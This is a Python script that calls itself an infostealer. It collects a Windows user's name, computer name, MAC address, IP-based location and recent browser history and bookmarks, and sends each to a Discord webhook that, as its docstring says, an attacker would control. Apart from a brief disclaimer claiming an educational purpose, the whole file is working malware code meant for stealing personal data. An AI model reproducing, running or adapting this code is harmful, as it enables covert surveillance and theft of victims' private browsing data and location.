"""
This script is an infostealer. It is intended to get the following user information: ip address, mac address, location, browser history & browser bookmarks.
It will then send the information to a discord webhook of your choice. In a real world scenario, the webhook would be controlled by the attacker.
Infostealer could also be used to steal cookies, passwords, sensitive files, etc.
This script is not intended to be malicious. It is intended to be used for educational purposes only.
If you use this script for malicious purposes, you are breaking the law.
"""

import os
import json
import requests
from getmac import get_mac_address
from discordwebhook import Discord
from browser_history import get_history, get_bookmarks

CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))


def connect_to_webhook(webhook_url):
    return Discord(url=webhook_url)


def get_victim_info():
    pc_user = os.getenv('USERNAME')
    pc_name = os.getenv('COMPUTERNAME')
    pc_mac = get_mac_address()
    return pc_user, pc_name, pc_mac


def send_embed(discord, title, fields):
    embed_temp = {
        "title": title,
        "color": 0,
        "fields": fields
    }
    discord.post(
        content="",
        username=f"{pc_user} | {pc_name}",
        embeds=[embed_temp]
    )


def victim_location(discord):
    response = requests.get("https://ipinfo.io/json")
    data = response.json()

    fields = [
        {"name": key.capitalize(), "value": value}
        for key, value in data.items()
        if key in ['ip', 'city', 'region', 'country', 'loc', 'org', 'postal', 'timezone']
    ]

    send_embed(discord, "Victim Location", fields)


def victim_history(discord):
    outputs = get_history()
    his = outputs.histories[-100:] # his is a list of (datetime.datetime, url) tuples
    his = [{'url': url, 'datetime': dt.isoformat()} for dt, url in his]

    fields = [{"name": f"URL {i}", "value": entry['url']} for i, entry in enumerate(his)]
    send_embed(discord, "Victim Browser History", fields)


def victim_bookmarks(discord):
    outputs = get_bookmarks()
    bms = outputs.bookmarks[-100:] # bms is a list of (datetime.datetime, url, title, folder) tuples
    bms = [{'url': url, 'datetime': dt.isoformat(), 'title': title, 'folder': folder} for dt, url, title, folder in bms]

    fields = [
        {"name": f"Bookmark {i}", "value": f"URL: {entry['url']}\nTitle: {entry['title']}\nFolder: {entry['folder']}"}
        for i, entry in enumerate(bms)
    ]
    send_embed(discord, "Victim Browser Bookmarks", fields)


if __name__ == "__main__":
    webhook_url = input("Enter Discord Webhook URL: ")
    discord = connect_to_webhook(webhook_url)
    pc_user, pc_name, pc_mac = get_victim_info()

    try:
        victim_location(discord)
    except Exception as e:
        print("Error in victim_location()")
        print(e)

    try:
        victim_history(discord)
    except Exception as e:
        print("Error in victim_history()")
        print(e)

    try:
        victim_bookmarks(discord)
    except Exception as e:
        print("Error in victim_bookmarks()")
        print(e)
